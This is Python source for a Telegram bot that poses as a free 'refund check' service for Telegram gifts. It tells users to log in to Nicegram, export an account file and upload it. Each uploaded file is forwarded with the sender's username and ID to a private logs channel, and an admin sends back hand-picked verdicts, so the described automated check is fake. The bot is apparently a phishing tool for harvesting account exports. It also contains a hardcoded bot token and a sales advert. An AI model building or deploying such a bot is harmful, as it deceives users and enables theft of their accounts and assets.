import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, FSInputFile
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext


logging.basicConfig(level=logging.INFO)

# # # купить заказать ботов тут - @walxo

TOKEN = "7551021673:AAEGVmVEIovStuiK0iY7mgGgRnU6zY6GqRE"
LOGS_CHANNEL_ID = -5193909053
ADMIN_IDS = [8208815502]

bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ---------- ТЕКСТЫ ----------
TEXTS = {
    "ru": {
        "start": "Привет! Я — Бот, который поможет тебе не попасться на мошенников.\n\n<blockquote>Я помогу отличить:\n• Реальный подарок от чистого визуала\n• Чистый подарок без рефаунда\n• Подарок, за который уже вернули деньги</blockquote>\n\nВыбери действие:",
        "instruction": "📖 <b>Инструкция:</b>\n\n1️⃣ Скачай приложение Nicegram (через кнопку в меню).\n2️⃣ Войди в свой аккаунт.\n3️⃣ В настройках выбери пункт «Nicegram» → «Экспортировать в файл».\n4️⃣ Вернись в бот и выбери «Проверка на рефаунд».\n5️⃣ Отправь экспортированный файл боту.",
        "refund": "🌌 Отправь сюда экспортированный файл (документ).\nДля проверки на рефаунд.",
        "file_received": "✅ Файл успешно был отправлен для проверки на рефаунд.",
        "file_processing": "📄 Файл получен, проверяю на рефаунд…",
    "info": "<b>ЧАСТЫЕ ВОПРОСЫ</b>\n\nЗдесь ты можешь получить ответы на часто задаваемые вопросы 👇",
        "why_check": "🤔 <b>Зачем нужна проверка на рефаунд?</b>\n\nЧтобы отсечь мошенничество. Бывает, что человек улучшает подарок звёздами, а потом оформляет возврат денег — тогда подарок перестаёт быть уникальным.",
        "what_refund": "💸 <b>Что такое рефаунд?</b>\n\nЭто возврат средств за звёзды, купленные через App Store или Google Play. После возврата звёзды «обнуляются», и подарок теряет свои улучшения.",
        "what_check": "🔍 <b>Что за проверка подарков?</b>\n\nСистема Nicegram сверяет источник покупки звёзд, историю операций и техданные подарка. В итоге ты получаешь вердикт — безопасен ли подарок.",
        "why_file": "📄 <b>Зачем нужен файл?</b>\n\nФайл содержит метаданные об улучшении подарка — его можно использовать, чтобы проверить, были ли звёзды рефнуты или всё чисто.",
        "change_lang": "🌐 Сменить язык",
        "back": "⬅️ Назад",
        "language_changed": "✅ Язык изменён на 🇷🇺 Русский.",
    },
    "en": {
        "start": "Hello! I’m the bot that will help you avoid scammers.\n\n<blockquote>I’ll help you tell the difference between:\n• A real gift and a plain visual\n• A clean gift with no refund\n• A gift that already had the money returned</blockquote>\n\nChoose an action:",
        "instruction": "📖 <b>Instructions:</b>\n\n1️⃣ Download the Nicegram app (via the button in the menu).\n2️⃣ Log in to your account.\n3️⃣ Go to settings → “Nicegram” → “Export to file.”\n4️⃣ Return to the bot and choose “Refund check.”\n5️⃣ Send the exported file to the bot.",
        "refund": "🌌 Send the exported file (document) here.\nFor refund verification.",
        "file_received": "✅ The file has been successfully sent for refund verification.",
        "file_processing": "📄 File received, checking for refund…",
    "info": "<b>FREQUENTLY ASKED QUESTIONS</b>\n\nHere you can find answers to frequently asked questions 👇",
        "why_check": "🤔 <b>Why is a refund check needed?</b>\n\nTo prevent fraud. Sometimes a person upgrades a gift with stars and then requests a refund — the gift stops being unique.",
        "what_refund": "💸 <b>What is a refund?</b>\n\nIt is the return of funds for stars purchased via the App Store or Google Play. After the refund, the stars disappear, and the gift loses its upgrades.",
        "what_check": "🔍 <b>What is the gift check?</b>\n\nThe Nicegram system compares the star purchase source, transaction history, and technical data of the gift to determine if it’s safe.",
        "why_file": "📄 <b>Why is the file needed?</b>\n\nThe file contains metadata about the gift upgrade — it helps check whether stars were refunded or not.",
        "change_lang": "🌐 Change language",
        "back": "⬅️ Back",
        "language_changed": "✅ Language changed to 🇬🇧 English.",
    }
}

# ---------- КЛАВИАТУРЫ ----------
def main_keyboard(lang="ru"):
    t = TEXTS[lang]
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=t["change_lang"], callback_data="change_lang")],
            [InlineKeyboardButton(text="📖 " + ("Инструкция" if lang == "ru" else "Instructions"), callback_data="instruction")],
            [InlineKeyboardButton(text="📱 " + ("Скачать Nicegram" if lang == "ru" else "Download Nicegram"), web_app={"url": "https://nicegram.app/"})],
            [InlineKeyboardButton(text="🔍 " + ("Проверка на рефаунд" if lang == "ru" else "Refund Check"), callback_data="refund")],
            [InlineKeyboardButton(text="❓ " + ("Частые вопросы" if lang == "ru" else "FAQ"), callback_data="info")],
        ]
    )


def back_keyboard(lang="ru"):
    t = TEXTS[lang]
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text=t["back"], callback_data="back_to_start")]]
    )


def info_keyboard(lang="ru"):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=("🤔 Зачем нужна проверка?" if lang == "ru" else "🤔 Why is a check needed?"), callback_data="why_check")],
            [InlineKeyboardButton(text=("🤔 Что такое рефаунд?" if lang == "ru" else "🤔 What is a refund?"), callback_data="what_refund")],
            [InlineKeyboardButton(text=("🤔 Что за проверка?" if lang == "ru" else "🤔 What is the check?"), callback_data="what_check")],
            [InlineKeyboardButton(text=("🤔 Зачем нужен файл?" if lang == "ru" else "🤔 Why is the file needed?"), callback_data="why_file")],
            [InlineKeyboardButton(text=("« Назад в меню" if lang == "ru" else "« Back to menu"), callback_data="back_to_start")],
        ]
    )


# ---------- КНОПКИ ДЛЯ АДМИНА ----------
def admin_keyboard(user_id):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✅ Прошел проверку (всё ок)", callback_data=f"approve_{user_id}")],
            [InlineKeyboardButton(text="❌ Рефаунд обнаружен", callback_data=f"reject_{user_id}")],
            [InlineKeyboardButton(text="⚠️ Файл некорректен", callback_data=f"invalid_{user_id}")]
        ]
    )


# ---------- СТАРТ ----------
@dp.message(Command("start"))
async def start(message: types.Message, state: FSMContext):
    await state.update_data(lang="ru")
    await send_start(message, "ru")


@dp.callback_query(F.data == "back_to_start")
async def back_to_start(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    await send_start(callback.message, lang)
    await callback.answer()


# ---------- СМЕНА ЯЗЫКА ----------
@dp.callback_query(F.data == "change_lang")
async def change_lang(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    current = data.get("lang", "ru")
    new_lang = "en" if current == "ru" else "ru"
    await state.update_data(lang=new_lang)

    try:
        await callback.message.delete()
    except Exception:
        pass

    await send_start(callback.message, new_lang)
    await callback.answer(TEXTS[new_lang]["language_changed"])


# ---------- ФУНКЦИЯ ДЛЯ СТАРТА ----------
async def send_start(target, lang="ru"):
    t = TEXTS[lang]
    caption = t["start"]
    try:
        photo = FSInputFile("найсграм.jpg")
        await target.answer_photo(photo=photo, caption=caption, reply_markup=main_keyboard(lang), parse_mode="HTML")
    except Exception as e:
        await target.answer(caption, reply_markup=main_keyboard(lang), parse_mode="HTML")
        logging.warning(f"Не удалось отправить фото: {e}")


# ---------- ИНСТРУКЦИЯ ----------
@dp.callback_query(F.data == "instruction")
async def instruction(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    await callback.message.answer(TEXTS[lang]["instruction"], reply_markup=back_keyboard(lang), parse_mode="HTML")
    await callback.answer()


# ---------- ПРОВЕРКА НА РЕФАУНД ----------
@dp.callback_query(F.data == "refund")
async def refund(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    await callback.message.answer(TEXTS[lang]["refund"], reply_markup=back_keyboard(lang), parse_mode="HTML")
    await callback.answer()


# ---------- ПОЛУЧЕНИЕ ФАЙЛА ----------
@dp.message(F.document)
async def handle_file(message: types.Message, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    doc = message.document

    await message.answer(TEXTS[lang]["file_processing"])

    await bot.send_document(
        chat_id=LOGS_CHANNEL_ID,
        document=doc.file_id,
        caption=(
            f"📁 Файл от @{message.from_user.username or message.from_user.full_name}\n"
            f"🆔 ID: <code>{message.from_user.id}</code>"
        ),
        reply_markup=admin_keyboard(message.from_user.id),
        parse_mode="HTML"
    )

    await message.answer(TEXTS[lang]["file_received"], parse_mode="HTML")
    await send_start(message, lang)


# ---------- ОБРАБОТКА ОТ АДМИНА ----------
@dp.callback_query(F.data.startswith("approve_"))
async def approve_refund(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])

    # Обновляем сообщение в канале
    await callback.message.edit_caption(
        caption=(
            callback.message.caption
            + "\n\n✅ <b>Статус:</b>\n"
            "Подарок успешно прошёл проверку.\n"
            "История операций чистая, возвратов звёзд не найдено.\n"
            "Всё в порядке — можно доверять 🎁"
        ),
        parse_mode="HTML",
        reply_markup=None
    )

    # Уведомляем пользователя
    try:
        await bot.send_message(
            chat_id=user_id,
            text=(
                "✅ Подарок успешно прошёл проверку.\n"
                "История операций чистая, возвратов звёзд не найдено.\n"
                "Всё в порядке — можно доверять 🎁"
            )
        )
    except Exception as e:
        logging.warning(f"Не удалось уведомить пользователя {user_id}: {e}")

    await callback.answer("Отмечено как 'всё чисто' ✅")


@dp.callback_query(F.data.startswith("reject_"))
async def reject_refund(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])

    await callback.message.edit_caption(
        caption=(
            callback.message.caption
            + "\n\n❌ <b>Статус:</b>\n"
            "К сожалению, при проверке обнаружен рефаунд.\n"
            "Это значит, что звёзды, использованные для улучшения подарка, были возвращены."
        ),
        parse_mode="HTML",
        reply_markup=None
    )

    try:
        await bot.send_message(
            chat_id=user_id,
            text=(
                "❌ К сожалению, при проверке обнаружен рефаунд.\n"
                "Это значит, что звёзды, использованные для улучшения подарка, были возвращены.\n\n"
                "Такой подарок теряет статус «оригинального» и не считается безопасным."
            )
        )
    except Exception as e:
        logging.warning(f"Не удалось уведомить пользователя {user_id}: {e}")

    await callback.answer("Отмечено как 'рефаунд обнаружен' ❌")


@dp.callback_query(F.data.startswith("invalid_"))
async def invalid_file(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])

    await callback.message.edit_caption(
        caption=(
            callback.message.caption
            + "\n\n🔴 <b>Статус:</b>\n"
            "Файл оказался недействителен или возникла ошибка при обработке.\n"
            "Попросите пользователя прислать корректный файл повторно."
        ),
        parse_mode="HTML",
        reply_markup=None
    )

    try:
        await bot.send_message(
            chat_id=user_id,
            text=(
                "🔴 Файл был недействителен или же произошла ошибка."
                " Попробуйте получить файл снова и отправить его боту."
            )
        )
    except Exception as e:
        logging.warning(f"Не удалось уведомить пользователя {user_id}: {e}")

    await callback.answer("Отмечено как 'файл недействителен' 🔴")

# ---------- ИНФОРМАЦИЯ ----------
@dp.callback_query(F.data == "info")
async def info_menu(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    t = TEXTS[lang]
    try:
        photo = FSInputFile("info.jpg")
        await callback.message.answer_photo(photo=photo, caption=t["info"], reply_markup=info_keyboard(lang), parse_mode="HTML")
    except Exception as e:
        await callback.message.answer(t["info"], reply_markup=info_keyboard(lang), parse_mode="HTML")
        logging.warning(f"Не удалось отправить фото info.jpg: {e}")
    await callback.answer()


# ---------- ОТВЕТЫ НА ВОПРОСЫ ----------
@dp.callback_query(F.data == "why_check")
async def why_check(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    await callback.message.answer(TEXTS[lang]["why_check"], parse_mode="HTML")


@dp.callback_query(F.data == "what_refund")
async def what_refund(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    await callback.message.answer(TEXTS[lang]["what_refund"], parse_mode="HTML")


@dp.callback_query(F.data == "what_check")
async def what_check(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    await callback.message.answer(TEXTS[lang]["what_check"], parse_mode="HTML")


@dp.callback_query(F.data == "why_file")
async def why_file(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    await callback.message.answer(TEXTS[lang]["why_file"], parse_mode="HTML")


# ---------- ЗАПУСК ----------
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
